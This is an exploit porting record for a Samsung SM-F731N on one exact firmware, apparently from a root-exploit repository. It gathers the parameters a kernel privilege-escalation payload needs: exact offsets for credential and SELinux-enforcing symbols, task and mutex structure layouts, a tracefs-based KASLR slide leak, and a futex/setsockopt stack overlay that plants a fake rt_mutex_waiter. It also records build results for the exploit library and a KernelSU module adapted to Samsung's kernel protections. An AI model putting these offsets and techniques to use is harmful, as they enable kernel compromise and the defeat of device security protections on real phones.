# SM-F731N / F731NKSS5EYGB clean port record

This record follows [`PORTING.md`](PORTING.md) and
[`../kernelsu/README.md`](../kernelsu/README.md). It contains only evidence
collected again for the connected `SM-F731N` and the exact EYGB firmware.

All earlier F731N target headers, payloads, KernelSU artifacts, build logs,
notes, and derived values are excluded from this port. In particular, no
`dm1q` value or artifact is an input.

## Status

The firmware, raw Image, recovered ELF, BTF, physical load addresses, payload
symbols, structure layouts, tracefs slide anchor, MCAST stack overlay, and P0
fingerprint have been derived during the clean pass.

The F731N target header and release payload have been produced and pass the
clean static gates recorded below. The exact-source KernelSU module and
late-load binary have not been produced. The support profile remains
unpublished.

## 1. Runtime identity

Read directly through ADB:

```text
serial: R3CW70LN8WY
model: SM-F731N
device: b5q
product: b5qksx
platform: kalama
display build: AP3A.240905.015.A2.F731NKSS5EYGB
fingerprint: samsung/b5qksx/b5q:15/AP3A.240905.015.A2/F731NKSS5EYGB:user/release-keys
security patch: 2025-08-01
SDK: 35
ABI: arm64-v8a
kernel release: 5.15.153-android13-8-30958511-abF731NKSS5EYGB
kernel build: #1 Thu Jul 31 08:04:36 UTC 2025
page size: 4096
sched_blocked_reason event ID: 108
```

Relevant configuration lines copied from the running `/proc/config.gz`:

```text
CONFIG_ARM64_PTR_AUTH=y
CONFIG_RKP=y
CONFIG_KDP=y
CONFIG_SHADOW_CALL_STACK=y
CONFIG_CFI_CLANG=y
CONFIG_CFI_CLANG_SHADOW=y
# CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT is not set
# CONFIG_MODULE_FORCE_LOAD is not set
CONFIG_MODVERSIONS=y
CONFIG_TRIM_UNUSED_KSYMS=y
CONFIG_KASAN=y
CONFIG_KASAN_HW_TAGS=y
```

Runtime facilities used by the repository payload are present:

```text
/dev/ashmem mode: 0666
tracefs: mounted read-write
configfs: mounted
```

The shell cannot read `/sys/kernel/btf/vmlinux`. BTF was recovered from the
exact firmware Image instead.

## 2. Exact firmware and Image

Samsung firmware identity:

```text
model/region: SM-F731N / KOO
version: F731NKSS5EYGB/F731NOKR5EYGB/F731NKSU5EYCA/F731NKSS5EYGB
package: work/firmware-kss/F731NKSS5EYGB_KOO.zip
package size: 10558901794
package SHA-256: cd043774a1476e5b56b0620ff3f56646bef3f1ac76c534251223c15a76842c74
```

Boot image and extracted ARM64 Image:

```text
boot.img size: 100663296
boot.img SHA-256: 67c59d5ec59280a53803c142529fdbaeeaac3b1c294971f41f6acd90f41266dc
raw Image: work/recovered/exact-kss/kernel.raw
raw Image size: 45550080
raw Image SHA-256: aec62d49d0ac91b8a9f5ec8695491d2b6655128dde4bcf18fc3b1bdd1ddcb2ca
boot header version: 4
ARM64 Image text_offset: 0x0
ARM64 Image image_size: 0x2dd0000
ARM64 Image flags: 0xa
```

The Image banner matches the connected device release exactly.

## 3. Recovered ELF and BTF

```text
ELF: work/recovered/exact-kss/vmlinux.elf
ELF size: 51636483
ELF SHA-256: 243164fb7e7b9a042e6ff9c52c712e108f0f397bace791e59c7ab256a33f6ec7
KIMAGE_TEXT_BASE: 0xffffffc008000000
numeric symbol list: work/recovered/exact-kss/vmlinux.nm
numeric symbol list SHA-256: 74b89be9e9ab24a1ec1449c97b669b7b6de5222383b08e107ab7fbef4f375129
validated raw BTF interval: [0x20f5f6c, 0x26a2451)
validated raw BTF size: 5948645
validated raw BTF SHA-256: bd3ca91839083211f18d1921c72be4f3eac97a403225ff1ca0997c787597624b
```

The BTF candidate passed the complete header, section-bound, and initial
string-table NUL checks required by `PORTING.md`. Exactly one candidate was
accepted. Both raw and C dumps are retained under
`work/recovered/exact-kss/`.

## 4. Exact payload symbol offsets

Every value below is an offset from `0xffffffc008000000` in the recovered
EYGB ELF:

| Target macro or use | Exact source | Offset |
| --- | --- | ---: |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x00103e50` |
| `COMMIT_CREDS_OFF` | `commit_creds` | `0x0011f840` |
| `PREPARE_KERNEL_CRED_OFF` | `prepare_kernel_cred` | `0x0011db04` |
| `OVERRIDE_CREDS_OFF` | `override_creds` | `0x0011e918` |
| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x004b6d9c` |
| `COPY_SPLICE_READ_OFF` | `generic_file_splice_read` | `0x00523f68` |
| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x005d30a0` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x005d3ac8` |
| `ASHMEM_IOCTL_OFF` | `ashmem_ioctl` | `0x010b5dcc` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `compat_ashmem_ioctl` | `0x010b6428` |
| `ASHMEM_MMAP_OFF` | `ashmem_mmap` | `0x010b6480` |
| `ASHMEM_OPEN_OFF` | `ashmem_open` | `0x010b6760` |
| `ASHMEM_RELEASE_OFF` | `ashmem_release` | `0x010b67f8` |
| `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x010b6914` |
| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x01da2ba0` |
| `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x01f20cd0` |
| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x01f77590` |
| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x0295e480` |
| logger array | `loggers` | `0x02961ce8` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `nfulnl_logger` | `0x02961dc0` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `nfulnl_logger.name` target string | `0x01c96866` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `random_table[boot_id].data` slot | `0x02a7f960` |
| `INIT_MM_OFF` | `init_mm` | `0x02ab8998` |
| `INIT_TASK_OFF` | `init_task` | `0x02ac9bc0` |
| `ASHMEM_MISC_FOPS_OFF` | `ashmem_misc + 0x10` | `0x02ac1b88` |
| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x02b79ac0` |
| `SELINUX_ENFORCING_OFF` | `selinux_state.enforcing` | `0x02c4e438` |
| `SLIDE_SYSCTL_BOOTID_OFF` | `sysctl_bootid` storage | `0x02ceaf29` |

Binary pointer checks against the recovered ELF:

- `ashmem_misc + offsetof(miscdevice, fops)` contains the exact
  `ashmem_fops` virtual address.
- The first qword of `nfulnl_logger` points to the exact
  `"nfnetlink_log"` string.
- `random_table` contains six entries. The unique `boot_id` entry is index 4,
  and its `.data` slot points to the exact `sysctl_bootid` storage.

## 5. Exact BTF layouts

The numeric values below come from the raw EYGB BTF dump.

```text
sizeof(struct ctl_table) = 0x40
ctl_table.data = 0x08

sizeof(struct file_operations) = 0x120
owner = 0x00
llseek = 0x08
read = 0x10
write = 0x18
read_iter = 0x20
write_iter = 0x28
unlocked_ioctl = 0x50
compat_ioctl = 0x58
mmap = 0x60
open = 0x70
release = 0x80
splice_read = 0xc8
show_fdinfo = 0xe0

sizeof(struct task_struct) = 0x1200
usage = 0x38
prio = 0x7c
normal_prio = 0x84
sched_task_group = 0x400
mm = 0x520
active_mm = 0x528
real_cred = 0x790
cred = 0x798
pi_lock = 0x884
pi_waiters = 0x898
pi_top_task = 0x8a8
pi_blocked_on = 0x8b0

sizeof(struct mm_struct) = 0x3e0
mm_struct.pgd = 0x40

sizeof(struct rt_mutex_waiter) = 0x58
tree = 0x00
pi_tree = 0x18
task = 0x30
lock = 0x38
wake_state = 0x40
prio = 0x44
deadline = 0x48
ww_ctx = 0x50

sizeof(struct rt_mutex_base) = 0x20
rt_mutex_base.owner = 0x18

sizeof(struct page) = 0x40
compound_head = 0x08
slab_cache = 0x18
page_type = 0x30
_refcount = 0x34
memcg_data = 0x38

sizeof(struct configfs_buffer) = 0x80
page = 0x10
needs_read_fill = 0x50
bin_buffer = 0x58
bin_buffer_size = 0x60
cb_max_size = 0x64

sizeof(struct configfs_bin_attribute) = 0x48
configfs_bin_attribute.cb_max_size = 0x30

sizeof(struct miscdevice) = 0x50
miscdevice.fops = 0x10

sizeof(struct selinux_state) = 0x88
selinux_state.enforcing = 0x00

sizeof(struct nf_logger) = 0x20
nf_logger.name = 0x00

sizeof(struct kmem_cache) = 0x108
useroffset = 0xf4
usersize = 0xf8

sizeof(struct work_struct) = 0x30
data = 0x00
entry = 0x08
func = 0x18

sizeof(struct workqueue_struct) = 0x140
dfl_pwq = 0xb0

sizeof(struct pool_workqueue) = 0x100
pool = 0x00
wq = 0x08
work_color = 0x10
refcnt = 0x18
nr_in_flight = 0x1c
nr_active = 0x5c
max_active = 0x60

sizeof(struct worker_pool) = 0x380
worklist = 0x20
nr_workers = 0x30
nr_idle = 0x34
```

## 6. Physical load proof

The exact BL archive contains a decompressed ABL ELF and its LinuxLoader PE.

```text
LinuxLoader PE SHA-256: a8a54488a278f9551cc1d56fc7ecea37b0be36cc06abcc55c5e0a68a38bca8f
UEFI memory-map Kernel region base: 0xa8000000
UEFI memory-map Kernel region size: 0x10000000
ARM64 Image text_offset: 0x0
LinuxLoader raw-Image fallback offset: 0x80000
DDR/direct-map physical base: 0x80000000
```

QcomBds publishes the Kernel region base and size as `KernelBaseAddr` and
`KernelSize`. LinuxLoader reads those variables and, for this raw ARM64 Image,
adds the `0x80000` fallback before transfer. Therefore:

```c
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xa8080000ULL
```

## 7. Slide and stack proof

### Tracefs anchor

`worker_thread` starts at image offset `0x0010d2f8`. Its blocking
`bl schedule` is at `0x0010d36c`, so the saved caller instruction is:

```c
#define SLIDE_TRACEFS_EVENT_ID 108
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0010d370ULL
```

With `sched_blocked_reason` enabled temporarily, the connected device produced
repeated `worker_thread+0x78` callers. Subtracting the exact caller offset
yielded a 64-KiB-aligned slide in the supported range. The trace event and
global tracing state were restored to disabled after collection.

### MCAST waiter overlay

The selected stack writer is the repository's existing
`MCAST_JOIN_SOURCE_GROUP` path. The offset was recalculated from the exact EYGB
ELF.

Futex path from syscall-entry SP to the waiter:

```text
__arm64_sys_futex frame:       0x080
do_futex frame:                0x140
futex_wait_requeue_pi frame:   0x1b0
waiter local offset:          +0x098
waiter address:               SP - 0x2d8
```

MCAST path from syscall-entry SP to the copied 0x108-byte request:

```text
__arm64_sys_setsockopt frame:  0x010
__sys_setsockopt frame:        0x070
sock_common_setsockopt frame:  0x010
ipv6_setsockopt frame:         0x040
do_ipv6_setsockopt frame:      0x2c0
request local offset:         +0x040
request address:              SP - 0x350
```

The required offset inside the request is therefore:

```text
(SP - 0x2d8) - (SP - 0x350) = 0x78
```

This lands fake waiter byte zero at the exact BTF `rt_mutex_waiter` base; its
members at `0x18`, `0x30`, `0x38`, `0x40`, `0x44`, `0x48`, and `0x50` remain
inside the 0x108-byte request.

```c
#define MCAST_WAITER_OFF 0x78
```

No pselect shift is accepted or required for this MCAST build.

## 8. P0 fingerprint

The repository generator was run against the exact raw Image for all 32
candidate slides from `0x000000` through `0x1f0000` in `0x10000` steps. Each
row contains the eight qwords at page offsets `0x000`, `0x200`, ..., `0xe00`.
All 256 source qwords were read back independently.

```text
generated file: work/generated/b5q-F731NKSS5EYGB/p0_fingerprint.h
rows: 32
qwords verified: 256
file size: 7476
file SHA-256: 19d8dbe1ad7415c1a7d94eb6c3ea4af157af28d94597cf2943ca541208412eb9
```

The independently verified file was copied without modification to:

```text
src/targets/b5q-F731NKSS5EYGB/p0_fingerprint.h
size: 7476
SHA-256: 19d8dbe1ad7415c1a7d94eb6c3ea4af157af28d94597cf2943ca541208412eb9
```

## 9. Clean target and payload build

The clean target header is:

```text
src/targets/b5q-F731NKSS5EYGB/target.h
size: 8654
SHA-256: d5b9aaa44412f06e3c439251e80cde6fa05275c203d693bb0dcbab870573647b
```

An automated comparison against the exact EYGB ELF and raw BTF passed:

```text
ELF symbol offsets checked: 23
BTF member offsets checked: 46
BTF structure sizes checked: 3
result: PASS
```

The target header and all shared app payload sources also passed an AArch64 C
syntax check. The release was then built with the official Android NDK r29
package `29.0.14206865` and the repository's `release` target:

```text
artifact: artifacts/b5q-F731NKSS5EYGB/cve-2026-43499-app.so
size: 104128
SHA-256: 4ccdcbad176c286ac5c5a6a8ade41473389da71ade461c725bef2ab05e020940
format: ELF64 little-endian AArch64 shared object
Android API: 35
NDK: r29 / 29.0.14206865
build label: b5q-F731NKSS5EYGB-clean-tracefs-mcast-configfs-pipe-root
```

Deleting the target build directory and running the same `release` target a
second time produced the identical 104128-byte file and SHA-256.

No payload hardware execution has been performed for this clean build.

## 10. KernelSU gate

The target requires an exact module and exact embedded late-load pair.

Required facts already established:

```text
KernelSU base: v3.2.5 / b0bc817b4e966aa6aa830834eaf6ef765d821d40
KMI family: android13-5.15
full vermagic release prefix: 5.15.153-android13-8-30958511-abF731NKSS5EYGB
CONFIG_MODULE_FORCE_LOAD: disabled
CONFIG_MODVERSIONS: enabled
CONFIG_TRIM_UNUSED_KSYMS: enabled
Samsung KDP/RKP: enabled
```

No existing F731N KO or `ksud` was accepted. Samsung Release Center lists this
exact EYGB source package:

```text
SM-F731N_KOR_15_Opensource_F731NTCS5EYG1_F731NKSS5EYG1_F731NTBS5EYG1_F731NKSS5EYGB_F731NTBS5EYGB_F731NTCS5EYGB.zip
```

The archive was unpacked outside the repository and used in place through the
clean work directory. Its source instructions select `b5q_kor_singlex` and
`kalama`. Provenance is:

```text
Kernel.tar.gz SHA-256: 75dd24f495cb8f12b6930cfcdb9b43b02cf047764a2668b4710e478a2265de8f
README_Kernel.txt SHA-256: c31f3f6d303831a45ff68c9f32c5ae38078d6654e9ab9a61c5038482a4df0e47
build_kernel_GKI.sh SHA-256: 60ead38c0ce4f57b2e7ae7d7e5f21edb9d8533e906e9019669c2e7787b387ddb
source kernel version: 5.15.153
source compiler selector: r450784e
compiler: Android clang 14.0.7 / r450784e
```

The runtime configuration contained an obsolete internal Samsung absolute path
for `CONFIG_UNUSED_KSYMS_WHITELIST`. The exact recovered EYGB `vmlinux.elf`
was used to generate 8349 CRC-bearing target symbols and the replacement raw
whitelist:

```text
Module.symvers.target SHA-256: 1ed4d7c58ddb5cf06ae9c598f37ecdc332372a067f27f6a8de9b8fe9eff72de3
abi_symbollist.raw SHA-256: adb843abe546174056549fdeb97a1435a8143641dea3d47f28859583393bbd45
entries: 8349
```

No other device's `Module.symvers` was imported. `olddefconfig` and
`modules_prepare` completed with the exact source and compiler. Both generated
release files contain:

```text
5.15.153-android13-8-30958511-abF731NKSS5EYGB
```

A fresh official KernelSU `v3.2.5` checkout resolved to commit
`b0bc817b4e966aa6aa830834eaf6ef765d821d40`. The repository Samsung
KDP/RKP/DEFEX patch passed `git apply --check` and applied cleanly. No dm1q
patch was applied. The only F731N-specific source change is recorded in
`kernelsu/patches/KernelSU-v3.2.5-b5q-eygb.patch`: the exact 5.15 source uses
`enum ucount_type` in `inc_rlimit_ucounts()` and `dec_rlimit_ucounts()`, rather
than the generic patch's `enum rlimit_type`. The F731N source declarations also
match the patch's KDP prototypes for `prepare_ro_creds()`, `kdp_assign_pgd()`,
and `kdp_usecount_dec_and_test()`.

The external module was built with:

```text
CONFIG_KSU=m
CONFIG_KSU_SAMSUNG_KDP=y
CONFIG_KSU_SAMSUNG_RKP=y
CONFIG_KSU_SAMSUNG_DEFEX=y
CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT=y
```

The stripped standalone module is:

```text
artifact: kernelsu/android13-5.15.153_kernelsu-b5q-F731NKSS5EYGB-kdp.ko
size: 358304
SHA-256: 3c01ebcfa0f5f03c379e65ae4a6970e7859f2869ead89252d38c5d71a1aa4e5c
vermagic: 5.15.153-android13-8-30958511-abF731NKSS5EYGB SMP preempt mod_unload modversions aarch64
undefined imports: 200
module version entries: 0
missing from exact target symbol table: 0
resolved through kallsyms rather than target exports: 64
target CRC mismatches: 0
stop_machine imports: 0
symtab/strtab retained: yes
```

`check_symbol` completed successfully. The repository target audit also passed
after debug-only stripping. Cleaning the module output and rebuilding produced
the identical 358304-byte file and SHA-256.

The exact module was copied to the `android13-5.15_kernelsu.ko` asset and a
full Android-target clean rebuild of `ksud` was performed with NDK r29:

```text
artifact: kernelsu/ksud-b5q-F731NKSS5EYGB-kdp
size: 4776064
SHA-256: 393162311d0c10377c024c0c74ff2790676c17024ae77928b4ecc1b30e7761b4
format: AArch64 Android 35 PIE
NDK: r29 / 29.0.14206865
embedded asset: android13-5.15_kernelsu.ko
embedded DEFLATE size: 113865
embedded offset: 74160
embedded compressed bytes match the standalone KO: yes
full-clean rebuild byte-identical: yes
```

No KernelSU module load has been attempted on hardware for this clean pair.

## 11. Publication and hardware gates

Do not add `b5q-F731NKSS5EYGB` to `support/targets-v3.json` until the clean
payload and exact KernelSU pair exist. All feed URLs must be repository-relative.

The final gates are:

```text
target.h static derivation audit: PASS
release payload build, size, SHA-256: PASS
exact-source KernelSU patch/build: PASS
KernelSU symbol and relocation audit: PASS
KO vermagic, size, SHA-256: PASS
ksud embedded-asset identity, size, SHA-256: PASS
support feed JSON/path validation: pending
payload hardware root checkpoint: pending
KernelSU late-load hardware checkpoint: pending
post-reboot stock-integrity recheck: pending
```

Panic, reboot, timeout, app failure, or missing explicit root checkpoint is a
failed hardware gate. A stack writer is not retried on the same boot after it
has executed.
